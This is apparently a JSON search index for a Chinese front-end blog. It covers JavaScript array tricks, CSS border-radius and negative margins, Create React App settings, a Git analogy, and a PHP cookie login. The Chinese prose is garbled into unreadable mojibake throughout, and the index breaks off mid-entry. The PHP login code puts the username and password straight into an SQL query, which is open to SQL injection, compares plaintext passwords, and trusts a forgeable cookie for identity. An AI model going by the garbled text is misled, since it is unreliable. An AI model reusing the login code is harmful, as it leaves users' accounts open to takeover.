å¦‚æœçœŸçš„æƒ³è¦ç”¨çš„è©±æ€éº¼è¾¦ï¼Ÿè©¦è©¦çœ‹ä¸‹é¢çš„åšæ³•å§ï¼ Array.from1234const string = 'I am PeaNu'const array = Array.from(string)console.log(array) // ['I', ' ', 'a', 'm', ' ', 'P', 'e', 'a', 'N', 'u']console.log(Array.isArray(array)) // true ES6 çš„å±•é–‹é‹ç®—å­ â€¦1234const string = 'I am PeaNu'const array = [...string]console.log(array) // ['I', ' ', 'a', 'm', ' ', 'P', 'e', 'a', 'N', 'u']console.log(Array.isArray(array)) // true","link":"/2022/01/20/convert-array-like-object-to-array/"},{"title":"å¿«é€Ÿè½‰æˆäºŒé€²ä½çš„æ–¹æ³•","text":"é›£é“ä½ è·Ÿä»¥å‰çš„æˆ‘ä¸€æ¨£ä»¥å‰ä¸çŸ¥é“å—ï¼Ÿ ç§˜è¨£String.toString(radix) å…¶å¯¦å¯ä»¥å¸¶å…¥ä¸€å€‹ radix ä¾†æŒ‡å®šè¦è½‰æˆå¹¾é€²ä½ï¼Œç¯„åœæ˜¯ 0 ~ 32ã€‚","link":"/2021/12/22/convert-number-base/"},{"title":"æŠŠ Object çš„ value æŠ½å‡ºä¾†è®Šæˆ Array","text":"ç›¸ä¿¡å°‡ä¾†æœƒéœ€è¦å®ƒã€‚ Object.valuesé€™æ˜¯æœ€ç°¡å–®åˆå¿«é€Ÿçš„æ–¹æ³•ï¼š 1234567const obj = { name: 'PeaNu', age: 20, gender: 'man'}const array = Object.values(obj)console.log(array) // [ 'PeaNu', 20, 'man' ] Object.keysåŸç†æ˜¯å…ˆæŠŠ key æŠ½å‡ºä¾†ï¼Œåœ¨ç”¨ key æŠŠ value æŠ½å‡ºä¾†è®Šæˆä¸€å€‹ Arrayï¼š 123456789const obj = { name: 'PeaNu', age: 20, gender: 'man'}const keysArray = Object.keys(obj) // [name, age, gender]const valueArray = keysArray.map((elem) =&gt; obj[elem])console.log(valueArray) // [ 'PeaNu', 20, 'man' ]console.log(Array.isArray(valueArray)) // true Object.entriesé€™å€‹åªæ˜¯é †ä¾¿ä»‹ç´¹ä¸€ä¸‹ä»–çš„ç”¨æ³•ï¼Œé€šå¸¸ä¸æœƒç”¨é€™æ‹›ä¾†å– valueã€‚ ç°¡å–®ä¾†èªªé€™å€‹æœƒæŠŠ key å’Œ value æ¹Šæˆä¸€çµ„ Arrayï¼Œè®Šæˆ [key, value]ï¼Œç›´æ¥ä¾†çœ‹ç¯„ä¾‹ï¼š 123456789101112const obj = { name: 'PeaNu', age: 20, gender: 'man'}const keyValueArray = Object.entries(obj)console.log(keyValueArray)// [// ['name', 'PeaNu'],// ['age', 20],// ['gender', 'man']// ] é€™é‚Šé€šå¸¸æœƒåœ¨æŠŠå®ƒåš flat() æˆ–æ˜¯ç”¨ for...of ä¾†å–å€¼ï¼š 12345678910111213const obj = { name: 'PeaNu', age: 20, gender: 'man'}for (const [key, value] of Object.entries(obj)) { // name, age, gender console.log('key', key) // PeaNu, 20 man console.log('value', value)}// ['name', 'PeaNu', 'age', 20, 'gender', 'man']console.log(Object.entries(obj).flat()) forâ€¦inåŸç†æ˜¯åˆ©ç”¨ for...in éæ­·ç‰©ä»¶çš„ key å†å–å‡º value ä¾†æ¨å…¥æ–°çš„ Arrayï¼š 12345678910let array = []const obj = { name: 'PeaNu', age: 20, gender: 'man'}for (let key in obj) { array.push(obj[key])}console.log(array) // [ 'PeaNu', 20, 'man' ] forâ€¦ofåŸç†æ˜¯ç”¨ Object.keys å–å‡º key çš„ Arrayï¼Œå†éæ­· Array å–å‡ºå€¼ï¼ˆå°±æ˜¯ç‰©ä»¶çš„ keyï¼‰ä¾†å»ºç«‹ Arrayï¼š 12345678910let array = []const obj = { name: 'PeaNu', age: 20, gender: 'man'}for (let value of Object.keys(obj)) { array.push(obj[value])}console.log(array) // [ 'PeaNu', 20, 'man' ]","link":"/2022/01/20/convert-object-value-to-array/"},{"title":"åˆ©ç”¨ Cookie å¯¦ä½œç™»å…¥æ©Ÿåˆ¶","text":"æƒ³è¨˜ä¸‹ä¾†ã€‚ ç°¡è¿°å› ç‚º HTTP å”è­°æœ¬èº«æ˜¯ã€Œç„¡ç‹€æ…‹ã€çš„ï¼Œæ‰€ä»¥è¦è®“å®ƒå¯ä»¥è¨˜å¾—ã€Œæ¯å€‹ request ä¹‹é–“çš„é—œè¯æ€§ã€æ‰èƒ½åšå‡ºç™»å…¥æ©Ÿåˆ¶ã€‚ ç™»å…¥çš„æµç¨‹æ˜¯é€™æ¨£å­ï¼š å¡«å¥½å¸³å¯†å¾Œé€å‡ºè¡¨å–® =&gt; ç¬¬ä¸€å€‹ request Server ç¢ºèªå¸³å¯†ç„¡èª¤ï¼Œé‡æ–°å°å›é¦–é  =&gt; ç¬¬äºŒå€‹ request ï¼ˆå›åˆ°é¦–é ä¹Ÿæœƒç™¼ä¸€å€‹ requestï¼‰ æœ€ç°¡å–®çš„æ–¹å¼Server å¯ä»¥é€é cookie ä¾†åšè¨­å®šï¼Œè®“ç€è¦½å™¨åœ¨ä¸‹ä¸€æ¬¡çš„ request è‡ªå‹•æŠŠ cookie å¸¶ä¸Šã€‚ æ‹¿ç•™è¨€æ¿çš„ä¾‹å­ä¾†èˆ‰ä¾‹ï¼š 123456789101112131415161718/* handle_login.php */&lt;?php $sql = \"SELECT * FROM users WHERE username='$username' AND password='$password'\"; // ä¸‹ query $result = $conn-&gt;query($sql); // æœ‰æ’ˆåˆ°è³‡æ–™å°±ä»£è¡¨å¸³è™Ÿå¯†ç¢¼æ­£ç¢º if ($result-&gt;num_rows &gt; 0) { // cookie çš„éæœŸæ™‚é–“ $expire = time() + 3600 * 24 * 30; // è¨­å®š cookie setcookie('username', $username, $expire); // ç™»å…¥æˆåŠŸï¼Œå°å›é¦–é  header('Location: ./index.php'); } else { // ç™»å…¥å¤±æ•—ï¼Œé¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ header('Location: ./login.php?errorCode=2'); }?&gt; ç•¶ç™»å…¥æˆåŠŸå¾Œï¼Œå¯ä»¥æ‰“é–‹ devtool çœ‹çœ‹é€™ä¹‹é–“ç™¼ç”Ÿäº†ä»€éº¼ã€‚ é¦–å…ˆï¼ŒServer æœƒå›å‚³ Set-Cookie é€™å€‹ headerï¼Œä¹Ÿå°±æ˜¯ PHP ä¸­å¯«å…¥çš„å€¼ username=$usernameï¼š æ¥è‘—è¢«å°å›é¦–é å¾Œï¼Œæœƒçœ‹åˆ° request header å°±æœƒè‡ªå‹•æŠŠå‰›å‰›çš„ cookie çµ¦å¸¶ä¸Šä¾†ï¼š é€™æ™‚å€™ index.php å°±å¯ä»¥åˆ©ç”¨ cookie çš„å€¼ä¾†æª¢æŸ¥é€™å€‹ user æœ‰æ²’æœ‰ç™»å…¥ï¼š 1234567891011121314151617/* index.php */&lt;?php require_once(\"./conn.php\"); require_once(\"./utils.php\"); // é è¨­å€¼ nullï¼Œä»£è¡¨æ²’æœ‰ç™»å…¥ $username = Null; // æª¢æŸ¥ cookie if (!empty($_COOKIE['username'])) { // å¦‚æœ cookie çš„ username æ¬„ä½æœ‰å€¼ï¼Œ // å°±æ›´æ–° $username çš„å€¼ $username = $_COOKIE['username']; // å»è³‡æ–™åº«æ’ˆå‡ºé€™å€‹ user çš„è³‡æ–™ $user = getUser($username); // é€™å€‹ user çš„æš±ç¨± $nickname = $user['nickname']; }?&gt; æœ€å¾Œå°±å®Œæˆç™»å…¥æ©Ÿåˆ¶äº†ï¼š é€™å°±æ˜¯æœ€æœ€æœ€åŸºæœ¬çš„ç™»å…¥åŠŸèƒ½äº†ï¼Œåªæ˜¯é€™å€‹åšæ³•æœ‰å€‹å•é¡Œï¼Œå°±æ˜¯åˆ¥äººå¯ä»¥ç«„æ”¹ cookie å€¼ä¾†å‡å†’åˆ¥äººèº«åˆ†ï¼Œé€™é‚Šæˆ‘å¦å¤–é–‹ä¸€ç¯‡æ–‡ç« ä¾†è§£é‡‹ï¼Œè«‹åƒè€ƒ ç•¶ Cookie è¢«ç«„æ”¹æœƒæ€éº¼æ¨£ï¼Ÿ","link":"/2022/02/08/cookie-and-login-system/"},{"title":"CRAï¼è§£æ±º source map è¼‰å…¥å•é¡Œçš„ Warning","text":"åªæ˜¯é †æ‰‹è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿°åœ¨ä½¿ç”¨ create-react-app æ™‚æœ‰æ™‚å€™æœƒç¢°åˆ°æŸäº›å¥—ä»¶çš„ source map ç„¡æ³•è¼‰å…¥ï¼Œæ‰€ä»¥ç·¨è­¯å®Œå¾Œå°±æœƒå‡ºç¾åº•ä¸‹çš„ Warning è¨Šæ¯ï¼š WARNING in ./node_modules/@firebase/auth/dist/auth.esm.jsModule Warning (from ./node_modules/source-map-loader/dist/cjs.js):Failed to parse source map â€¦ ç¸½ä¹‹é€™å€‹è§£æ³•æœ‰å…©å€‹ï¼š 1. åˆ° react-script ä¸­è¨­å®š webpack configï¼š é™„è¨»ï¼šè·¯å¾‘ç‚º packages/react-scripts/config/webpack.config.js 123456789101112 // Turn off performance processing because we utilize // our own hints via the FileSizeReporter performance: false, // åŠ ä¸Šä¸‹é¢é€™æ®µ ignoreWarnings: [ // Ignore warnings raised by source-map-loader. // some third party packages may ship miss-configured sourcemaps, that interrupts the build // See: https://github.com/facebook/create-react-app/discussions/11278#discussioncomment-1780169 { message: /source-map-loader/ }, ], };}; 2. åœ¨æ ¹ç›®éŒ„ä¸‹å»ºç«‹ .env æª”æ¡ˆï¼š 1GENERATE_SOURCEMAP=false åƒè€ƒè³‡æº fix: ignore webpack warnings by source-map-loader Failed to parse source map","link":"/2022/07/01/cra-source-map-problem/"},{"title":"åˆ©ç”¨ border-radius ä¾†ç•«åœ“å½¢","text":"é‚„è »å¸¸ç”¨åˆ°çš„ä¸€å€‹å°æŠ€å·§ ç¤ºç¯„åªè¦åšå‡ºä¸€å€‹æ­£æ–¹å½¢ï¼Œå†è¨­å®š border-radius ç‚ºå¯¬åº¦çš„ä¸€åŠå°±èƒ½ç•«å‡ºä¾†ï¼š 1&lt;div class=\"box\"&gt;box1&lt;/div&gt; 123456.box { width: 100px; height: 100px; /* 50px è·Ÿ 50% æ˜¯ä¸€æ¨£çš„ */ border-radius: 50px;} æ·ºè«‡ border-radius çš„åŸç†border-radius è¨­å®šçš„æ˜¯ä¸€å€‹åœ“çš„ã€ŒåŠå¾‘ã€ï¼Œè€ŒåŸç†å°±æ˜¯ã€Œç•«ä¸€å€‹åœ“å½¢ã€ä¾†åˆ‡å‰²å‡ºåœ“è§’ã€‚ æ‰€ä»¥å…¶å¯¦å®ƒå®Œæ•´çš„å¯«æ³•æ‡‰è©²æ˜¯é€™æ¨£å­ï¼š 123.box { border-radius: 50px/50px} ä»£è¡¨é€™å€‹åœ“çš„å‚ç›´åŠå¾‘æ˜¯ 50pxï¼Œæ°´å¹³åŠå¾‘æ˜¯ 50pxï¼š æ¥è‘—å†æ‹¿é€™å€‹åœ“å»åˆ‡å‰²å‡ºåœ“è§’ï¼š çµæœï¼š å‚™è¨»ï¼šç‚ºäº†æ–¹ä¾¿ç†è§£ï¼Œæ‰€ä»¥é€™è£¡å…ˆæŠŠæ­£æ–¹å½¢å°ºå¯¸è¨­ç‚º 150pxï¼Œæ‰€ä»¥æœ€å¾Œåˆ‡å‡ºä¾†æ‰æœƒä¸æ˜¯åœ“å½¢ã€‚ åœ¨åœ“å½¢çš„æƒ…æ³ä¸‹æ˜¯é€™æ¨£å­ï¼š çµæœï¼š æƒ³äº†è§£æ›´å¤šå¯ä»¥åƒè€ƒï¼šäº†è§£ä¸€ä¸‹border-radiusçš„å®ç°åŸç†","link":"/2022/01/12/create-a-circle-by-border-radius/"},{"title":"å»ºç«‹ Array çš„åˆ¥ç¨®æ–¹æ³•","text":"æœ‰äº›æ™‚å€™è »å¯¦ç”¨çš„ã€‚ ä»¥æ•¸åˆ—ä¾†èˆ‰ä¾‹å‡è¨­æƒ³ç”¢ç”Ÿ 1~10 çš„æ•¸åˆ—ï¼Œæœ‰ä»¥ä¸‹å¹¾ç¨®åšæ³•ï¼š Array(n) + map1console.log(Array(10).fill(0).map((elem, index) =&gt; index + 1)) æ­¥é©Ÿæ˜¯é€™æ¨£å­ï¼š 123Array(10) =&gt; [empty x 10]fill(0) =&gt; [0, 0, 0, ...]map((elem, index) =&gt; index + 1) =&gt; return 1, return 2, return 3, ... å› ç‚ºå…ƒç´ ä¸€é–‹å§‹æ˜¯ emptyï¼Œmap æ˜¯æ”¶ä¸åˆ°çš„ï¼Œæ‰€ä»¥ä¸€å®šè¦å…ˆç”¨ fill ä¾†å¡«å€¼ map æ‰èƒ½æ”¶åˆ°ã€‚ Array.from({length: n}) + map1console.log(Array.from({length: 10}).map((elem, index) =&gt; index + 1)) è§£é‡‹ä¸€ä¸‹ï¼ŒArray.from() æ˜¯åœ¨è£¡é¢å¡ array-like çš„ç‰©ä»¶ä¾†ã€Œç”¢ç”Ÿæ–°é™£åˆ—ã€ï¼Œè€Œç²—ç•¥ä¸€é»ä¾†èªªåªè¦æœ‰ length å±¬æ€§çš„ç‰©ä»¶éƒ½å¯ä»¥ç•¶ä½œæ˜¯ array-likeï¼Œæ‰€ä»¥ï¼š 12345678const newArr1 = Array.from('str')const newArr2 = Array.from({a: '1', b: '2', c: '3'}) // çœŸçš„ç‰©ä»¶const newArr3 = Array.from({a: '1', b: '2', c: '3', length: 3}, ) // array-likeconst newArr4 = Array.from({0: 'A', 1: 'B', 2: 'C', length: 3}, ) // array-likeconsole.log(newArr1) // ['s', 't', 'r']console.log(newArr2) // []console.log(newArr3) // [undefined, undefined, undefined]console.log(newArr4) // ['A', 'B', 'C'] Array.from æœƒè©¦è‘—ç”¨ obj[i] å»å­˜å– key å°æ‡‰åˆ°çš„ valueï¼Œæ‰€ä»¥ newArr4 å¯ä»¥å¾—åˆ° 'A' 'B' 'C' ä½†æ˜¯ newArr3 åªæœƒå¾—åˆ° undefinedï¼ˆå› ç‚ºæ²’æœ‰å°æ‡‰çš„ key å€¼ï¼‰ æ‰€ä»¥ Array.from({length: 10} å…¶å¯¦å°±æ˜¯å¹«ä½ ç”¢ç”Ÿ 10 å€‹ undefined çš„å…ƒç´ ï¼Œåƒé€™æ¨£ï¼š 1Array.from({length: 10}) =&gt; [undefined, undefined, undefined, undefined, ...] æ¥è‘—å†ç”¨ map ä¾†æ”¹æˆæˆ‘å€‘å¸Œæœ›çš„å€¼è€Œå·²ï¼ŒåŸç†å…¶å¯¦å°±è·Ÿç¬¬ä¸€ç¨®æ–¹æ³•ä¸€æ¨¡ä¸€æ¨£ï¼š 1[undefined, undefined,].map(elem, index) =&gt; index + 1) =&gt; [1, 2, 3, ...] æˆ–å…¶å¯¦æ•´å€‹ç¨‹å¼ç¢¼é‚„å¯ä»¥å†ç¸®å¯«æˆé€™æ¨£ï¼š 1console.log(Array.from({length: 10}, (elem, index) =&gt; index + 1)) å› ç‚º Array.from çš„ç¬¬äºŒå€‹åƒæ•¸å°±æ˜¯ mapã€‚","link":"/2022/01/05/create-array-methods/"},{"title":"åœ¨ Create React App ä¸­ä½¿ç”¨çµ•å°è·¯å¾‘","text":"å¾ˆå¯¦ç”¨çš„è¨­å®šã€‚ ç°¡è¿°é›–ç„¶ å®˜æ–¹æ–‡ä»¶ è£¡å°±æœ‰è£œå……é€™ä¸€é»ï¼Œä¸éé‚„æ˜¯æƒ³é †ä¾¿è¨˜éŒ„ä¸€ä¸‹ã€‚ ç°¡å–®ä¾†èªªï¼Œåœ¨æ²’åšä»»ä½•è¨­å®šæ™‚ï¼Œç•¶æˆ‘å€‘è¦ import æ™‚éƒ½åªèƒ½ç”¨ã€Œç›¸å°è·¯å¾‘ã€ï¼Œåƒé€™æ¨£ï¼š 123456// å‡è¨­ç›®å‰ä½ç½®ç‚º src/components/Componentimport { getUser } from \"../utils/api\"function Component () { return ...} å¾ˆæ˜é¡¯çš„ç¼ºé»æ˜¯ç•¶è³‡æ–™çµæ§‹è¶Šè¤‡é›œæ™‚ï¼Œè·¯å¾‘å°±æœƒè®Šå¾—è¶Šé›£è™•ç†ã€‚ æ‰€ä»¥åªè¦åŠ ä¸Šä¸€å€‹è¨­å®šå¾Œï¼Œå°±å¯ä»¥è®Šæˆé€™æ¨£ï¼š 12345import { getUser } from \"utils/api\"function Component () { return ...} æ”¹ç”¨çµ•å°è·¯å¾‘çš„æ–¹å¼ä¾†è¨­å®šæœƒç°¡å–®è¨±å¤šã€‚ è¨­å®šæ–¹å¼å¦‚æœæ˜¯ JS çš„è©±å»ºç«‹ jsconfig.jsonï¼ŒTS çš„è©±å»ºç«‹ tsconfig.jsonï¼Œç„¶å¾ŒåŠ ä¸Šé€™æ®µï¼š 123456{ \"compilerOptions\": { \"baseUrl\": \"src\" }, \"include\": [\"src\"]} æ‡‰è©²çœ‹ä¸€ä¸‹å…§å®¹å°±çŸ¥é“é€™æ˜¯æŠŠ baseUrl çš„ä½ç½®è¨­ç‚º srcï¼Œæ‰€ä»¥ç•¶æˆ‘æƒ³ç”¨ä»»ä½• src åº•ä¸‹çš„æ±è¥¿æ™‚ï¼Œåªè¦ dir/***/*** å°±èƒ½ç›´æ¥æå®šäº†ã€‚","link":"/2022/06/26/create-react-app-set-absolute-path/"},{"title":"å¾è‡ªå·±åšç‰ˆæ§ä¾†å­¸ Git","text":"å‡è¨­è¦ä½ åšä¸€å€‹ç‰ˆæœ¬æ§åˆ¶ï¼Œä½ æœƒæ€éº¼åšï¼Ÿ è·Ÿè‘—é€™å€‹æ–‡ç« ä¸€èµ·åšï¼Œåšå®Œå¾Œä½ å°±æœƒç™¼ç¾ Git çš„æ¦‚å¿µå…¶å¯¦å¾ˆç°¡å–®ï¼Œæ²’æœ‰ä½ æƒ³çš„é‚£éº¼è¤‡é›œï¼ å‹•æ‰‹åšä¸€åšå‡è¨­ä½ æœ‰ä¸€äº›æª”æ¡ˆé•·é€™æ¨£ï¼š 12code_v1note_v1 å‡è¨­ code_v1 æœ‰æ›´æ–°æ™‚ï¼Œä½ æ‡‰è©²æœƒé€™æ¨£åšï¼š 123code_v2code_v1note_v1 éš¨è‘—æ›´æ–°è¶Šä¾†è¶Šå¤šæ™‚ï¼Œæœ€å¾Œå¯èƒ½è®Šæˆé€™æ¨£ï¼š 123456code_v9code_v2code_v3note_v1note_v4note_v5 ç•¶æª”æ¡ˆè®Šæˆé€™æ¨£å­æ™‚ï¼Œæœƒæœ‰ä¸€å€‹å•é¡Œï¼šä½ æ€éº¼çŸ¥é“å“ªä¸€å€‹ code æ˜¯å°æ‡‰åˆ°å“ªä¸€å€‹ noteï¼Ÿ å¦‚æœé€™äº›æª”æ¡ˆæ˜¯ä¸€å€‹ç¨‹å¼çš„è©±ï¼Œé‚£éº»ç…©å°±æœƒå¾ˆå¤§ã€‚å¦‚æœä½ æ²’æœ‰ç”¨å°æ‡‰çš„ code å»æ­å°æ‡‰çš„ noteï¼Œä½ çš„ç¨‹å¼å¯èƒ½å°±æœƒå‡ºéŒ¯ã€‚ é‚£æœ‰æ²’æœ‰ä»€éº¼æ›´å¥½çš„åšæ³•å‘¢ï¼Ÿ æœ‰é˜¿ï¼Œæ¯æ¬¡åªè¦ä¸€æ›´æ–°ï¼Œæˆ‘å°±é–‹ä¸€å€‹ã€Œæ–°çš„è³‡æ–™å¤¾ã€ä¾†å„²å­˜æ‰€æœ‰æœ€æ–°çš„æª”æ¡ˆä¸å°± OK äº†å—ï¼š 123-- v1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note å¾ˆå¤šæ¬¡çš„æ›´æ–°å¾Œâ€¦ 123456789-- v1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note-- v2ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note... é€™æ¨£å°±è§£æ±ºäº†ã€Œç›¸ä¾æ€§ã€çš„å•é¡Œã€‚ç¾åœ¨ä¸ç®¡æ˜¯å“ªä¸€å€‹è³‡æ–™å¤¾å…§çš„ code è·Ÿ noteï¼Œæˆ‘å€‘éƒ½èƒ½ç¢ºä¿ä»–ä¸€å®šå¯ä»¥æ­£å¸¸é‹ä½œã€‚ ç¾åœ¨å¦å¤–ä¸€å€‹å•é¡Œä¾†äº†ï¼Œå¦‚æœæœ‰äº›æª”æ¡ˆæˆ‘ä¸æƒ³è¦åŠ å…¥ç‰ˆæ§å‘¢ï¼Ÿ ä¹Ÿä¸ç”¨æƒ³å¾—å¤ªè¤‡é›œå•¦ï¼Œæ—¢ç„¶æˆ‘å€‘æœƒæŠŠè¦åšç‰ˆæ§çš„æª”æ¡ˆéƒ½æ”¾åˆ°ä¸€å€‹è³‡æ–™å¤¾ä¸­ï¼Œé‚£åªè¦åéä¾†æ€è€ƒå°±å¥½ï¼Œæˆ‘å€‘ä¸æƒ³è¦åšç‰ˆæ§çš„æª”æ¡ˆï¼Œå°±ã€Œä¸è¦æ”¾åˆ°è³‡æ–™å¤¾ã€ä¸­ï¼š 1234-- v1ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note--abcï¼ˆä¸è¦åšç‰ˆæ§çš„æª”æ¡ˆï¼‰ å¾ˆå¤šæ¬¡çš„æ›´æ–°å¾Œâ€¦ 123456789-- v1ï¼ˆè³‡æ–™å¤¾ï¼‰-- v2ï¼ˆè³‡æ–™å¤¾ï¼‰...-- v10ï¼ˆè³‡æ–™å¤¾ï¼‰ --code --note--abcï¼ˆä¸è¦åšç‰ˆæ§çš„æª”æ¡ˆï¼‰ æ‰€ä»¥ abc æ°¸é å°±åªæœƒæ˜¯ abcï¼Œä¸ç®¡åšäº†å¹¾æ¬¡æ›´æ–°ï¼Œä»–éƒ½èˆ‡æˆ‘å€‘çš„ç‰ˆæ§æ²’æœ‰é—œä¿‚ã€‚ ä¿®ä½†å¹¾å‹’ï¼ åœ¨ä½ æº–å‚™æ´—æ´—ç¡ä¹‹å‰ï¼Œé‚„æœ‰æœ€å¾Œä¸€å€‹å•é¡Œåˆè¹¦å‡ºä¾†äº†ï¼šå¦‚æœå¤šäººå”ä½œçš„è©±è¦æ€éº¼è¾¦ï¼Ÿ æ²’éŒ¯ï¼Œæˆ‘å€‘çš„ç²¾å¿ƒè£½ä½œçš„ç‰ˆæ§åœ¨ã€Œåªæœ‰ä¸€å€‹äººçš„æƒ…æ³ä¸‹ã€ï¼Œå¯ä»¥èªªæ˜¯å®Œç¾æ–¼ç¼ºçš„ï¼›ä½†å¦‚æœä¸æ˜¯å‘¢ï¼Ÿ æƒ³ä¸€ä¸‹é€™å€‹æƒ…å¢ƒï¼š 123-- v1 --code --note PeaNu å° v1 åšäº†ä¸€é»æ›´æ–°ï¼Œæ‰€ä»¥å»ºç«‹äº†ä¸€å€‹æ–°çš„è³‡æ–™å¤¾ã€‚ 123-- v2 --code --note PPB å° v1 åšäº†ä¸€é»æ›´æ–°ï¼Œæ‰€ä»¥å»ºç«‹äº†ä¸€å€‹æ–°çš„è³‡æ–™å¤¾ã€‚ 123-- v2 --code --note è°æ˜çš„ä½ çŸ¥é“é€™å€‹æ™‚å€™å°±æœƒæœ‰å•é¡Œäº†ï¼Œå› ç‚º PeaNu è·Ÿ PPB çš„æª”æ¡ˆåç¨±éƒ½æ˜¯ v2ï¼Œæœƒæœ‰é‡è¤‡å‘½åçš„å•é¡Œã€‚ è°æ˜çš„ä½ åˆçŸ¥é“ï¼Œæ—¢ç„¶é€™æ¨£æœƒæœ‰é‡è¤‡å‘½åçš„å•é¡Œï¼Œé‚£æˆ‘æ¯ä¸€æ¬¡éƒ½ç”¨ã€Œäº‚æ•¸ã€ä¾†å¹«è³‡æ–™å¤¾å‘½åå°±å¥½äº†å‘€ï¼ 123-- kjdanskdqwwe --code --note PeaNu å° kjdanskdqwwe åšäº†ä¸€é»æ›´æ–°ï¼Œæ‰€ä»¥å»ºç«‹äº†ä¸€å€‹æ–°çš„è³‡æ–™å¤¾ã€‚ 123-- njkdnkngwf --code --note PPB å° kjdanskdqwwe åšäº†ä¸€é»æ›´æ–°ï¼Œæ‰€ä»¥å»ºç«‹äº†ä¸€å€‹æ–°çš„è³‡æ–™å¤¾ã€‚ 123-- 4oy904ue9tjwr --code --note æ‰€ä»¥æœ€å¾Œçš„æƒ…æ³æœƒæ˜¯é€™æ¨£ï¼š 123-- kjdanskdqwwe-- 4oy904ue9tjwr-- njkdnkngwf å¥½å•¦ï¼Œç¾åœ¨ç¢ºå¯¦è§£æ±ºäº†é‡è¤‡å‘½åçš„å•é¡Œï¼Œä½†æˆ‘ç¾åœ¨æ˜¯è¦æ€éº¼çŸ¥é“å“ªå€‹æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ï¼Œé‚„æœ‰æ¯å€‹ç‰ˆæœ¬çš„é †åºï¼Ÿ åˆ¥æ€¥ï¼Œæˆ‘å€‘åœ¨é–‹ä¸€å€‹æª”æ¡ˆç”¨ä¾†åšè¨˜éŒ„ä¸å°±å¥½äº†å—ï¼š 123456-- kjdanskdqwwe-- 4oy904ue9tjwr-- njkdnkngwf--orderï¼ˆå„²å­˜ç‰ˆæœ¬çš„é †åºï¼škjdanskdqwwe -&gt; ... -&gt; njkdnkngwfï¼‰--newestï¼ˆå„²å­˜æœ€æ–°çš„ç‰ˆæœ¬ï¼š4oy904ue9tjwrï¼‰ æ­å–œä½ ï¼Œç¾åœ¨ä½ çš„ç‰ˆæ§ä¸è«–æ˜¯å–®äººæˆ–å¤šäººå”ä½œéƒ½èƒ½å¹³å¹³å®‰å®‰ï¼Œè€Œä¸”é‚„å¯ä»¥é¸æ“‡é‚£äº›æ±è¥¿è¦åšç‰ˆæ§ï¼Œå“ªäº›ä¸è¦ã€‚ ç¸½çµæœ€å¾Œä¾†è¤‡ç¿’ä¸€ä¸‹æ•´å€‹æµç¨‹å§ï¼š æ¯ç•¶ç™¼ç”Ÿæ›´æ–°ï¼Œå°±å»ºç«‹ä¸€å€‹æ–°çš„è³‡æ–™å¤¾ ä¸è¦åšç‰ˆæ§çš„æª”æ¡ˆï¼Œå°±ä¸è¦æ”¾åˆ°è³‡æ–™å¤¾ ç‚ºäº†é¿å…å‘½åè¡çªï¼Œæ¯ä¸€å€‹è³‡æ–™å¤¾éƒ½æœƒç”¨äº‚æ•¸ä¾†å‘½å ç‚ºäº†çŸ¥é“å“ªå€‹ç‰ˆæœ¬æœ€æ–°ï¼Ÿç‰ˆæœ¬çš„é †åºï¼Ÿæˆ‘å€‘å»ºç«‹äº†å…©å€‹æª”æ¡ˆä¾†åšç´€éŒ„ ä¸çŸ¥é“ä½ æœ‰æ²’æœ‰ç™¼ç¾ï¼Œå…¶å¯¦é€™å°±æ˜¯ã€ŒGitã€åœ¨å¹«ä½ åšçš„äº‹æƒ…ï¼ é›–ç„¶èƒŒå¾Œçš„åŸç†ä¸å®Œå…¨æ˜¯é€™æ¨£å­ï¼Œä½†åªè¦ç”¨é€™ç¨®æ–¹å¼ä¸‹å»æ€è€ƒï¼Œæˆ‘ä¿è­‰ä½ ä¸å†è¦ºå¾— Git æœ‰ä»€éº¼å›°é›£çš„ã€‚","link":"/2021/12/12/create-your-own-version-control/"},{"title":"CSS ä¹‹ margin è² å€¼çš„å…§æ¶µ","text":"ä¸€å€‹é‚„è »æœ‰æ„æ€çš„å·®ç•°ã€‚ é—œæ–¼ margin è² å€¼margin è² å€¼é›–ç„¶ä¸æ˜¯å€‹å¤ªè¤‡é›œçš„æ¦‚å¿µï¼Œä½†å®ƒå…¶å¯¦è »è—è‘—ä¸€äº›å°é™·é˜±ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œä½ å¯èƒ½çŸ¥é“ margin è² å€¼å¯ä»¥æŠŠæŸå€‹å…ƒç´ å¾€åæ–¹å‘ç§»å‹•ï¼Œä½†å¦‚æœæˆ‘ç¾åœ¨å‘Šè¨´ä½ ï¼šmargin-left: -20px è·Ÿ margin-right: -20px å…¶å¯¦æœ‰å·®ç•°çš„ï¼Œä½ èƒ½èªªå‡ºæ˜¯å“ªå€‹åœ°æ–¹æœ‰å·®ç•°å—ï¼Ÿ é€™æ˜¯æˆ‘åœ¨ stackoverflow æ‰¾åˆ°çš„è³‡æ–™ï¼š left and right negative margins donâ€™t behave the same : negative margin-left pulls the styled element towards the left, while negative margin-right pulls the adjacent right element towards the styled element. It doesnâ€™t move the styled element itself. ç°¡å–®ä¾†èªªï¼š margin-left è² å€¼ï¼šæŠŠå…ƒç´ è‡ªå·±å¾€å·¦é‚Šæ‹‰ã€‚ margin-right è² å€¼ : æŠŠå…ƒç´ å³é‚Šçš„å…ƒç´ å¾€è‡ªå·±é€™é‚Šæ‹‰ï¼ˆå…ƒç´ è‡ªå·±ä¸æœƒç§»å‹•ï¼‰ã€‚ æˆ‘å€‘ä¾†è©¦è©¦çœ‹ï¼š 1234567891011&lt;section class=\"left\"&gt; &lt;h2&gt;margin-left è² å€¼&lt;/h2&gt; &lt;div class=\"target\"&gt;Target&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;/section&gt;&lt;section class=\"right\"&gt; &lt;h2&gt;margin-right è² å€¼&lt;/h2&gt; &lt;div class=\"target\"&gt;Target&lt;/div&gt; &lt;div&gt;&lt;/div&gt;&lt;/section&gt; 12345678910111213141516171819202122232425section { width: 500px; margin: 100px auto; font-family: sans-serif; border: 1px solid #000;}div { display: inline-block; width: 100px; height: 100px; background-color: orange; vertical-align: middle; line-height: 100px; text-align: center;}div.target { background-color: pink;}/* é‡é»æ˜¯é€™é‚Šï¼Œå…¶ä»–ä¸é‡è¦ */.left .target { margin-left: -50px;}.right .target { margin-right: -50px;} çµæœï¼š","link":"/2022/01/16/css-about-negative-margin/"},{"title":"CSS 